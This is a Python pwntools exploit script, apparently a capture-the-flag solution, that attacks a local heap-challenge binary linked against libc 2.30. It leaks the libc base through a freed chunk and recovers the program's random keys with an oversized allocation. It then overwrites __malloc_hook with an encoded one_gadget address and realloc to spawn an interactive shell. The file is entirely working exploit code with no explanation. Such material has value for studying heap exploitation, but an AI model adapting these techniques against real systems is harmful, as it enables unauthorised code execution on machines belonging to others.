from pwn import*
from LD import*
def new(size,sign = 0):
    p.sendlineafter('Exit','1')
    p.sendlineafter('Size: ',str(size))
    if sign:
    	return
    p.recvuntil('Key: \n')

def free(idx):
    p.sendlineafter('Exit','2')
    p.sendlineafter('ID: ',str(idx))

def enc(idx,off,content):
    p.sendlineafter('Exit','3')
    p.sendlineafter('ID: ',str(idx))
    p.sendlineafter('Offset of msg: ',str(off))
    p.sendlineafter('Len of msg: ','16')
    p.sendafter('Msg: ',content)

def leak(idx):
    p.sendlineafter('Exit','4')
    p.sendlineafter('Box ID: ',str(idx))
    p.sendlineafter('Offset of msg: ','0')
    p.sendlineafter('Len of msg: ','8')
    p.recvuntil('Msg: \n')

libc = ELF('./libc-2.30.so',checksec=False)
p = process('./main')
context.log_level ='DEBUG'
new(0x500)
new(0x200)
free(0)
new(0x500)
leak(0)
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x60 - 0x10 - libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
free_hook = libc_base + libc.sym['__free_hook']
one_gadget = [0xCB79A,0xCB79D,0xCB7A0,0xE926B, 0xE9277]  #Kali 2.30
rce = libc_base + one_gadget[3]
realloc = libc_base + libc.sym['realloc']
new(0x7FFFFFFF00000000+0xFF0)
rand_1 =p.recv(24).replace(' ','')
rand_2 =p.recv(24).replace(' ','')
randq_1 = ''
randq_2 = ''
for i in range(15,-1,-2):
	randq_1 += (rand_1[i-1] + rand_1[i])
	randq_2 += (rand_2[i-1] + rand_2[i])
rceq = (int(randq_1,16) ^ rce)&0xFFFFFFFFFFFFFFFF
reallocq = (int(randq_2,16) ^ realloc)&0xFFFFFFFFFFFFFFFF
enc(2,str(malloc_hook-8),p64(rceq) + p64(reallocq))
new(0x200,sign=1)
p.interactive()
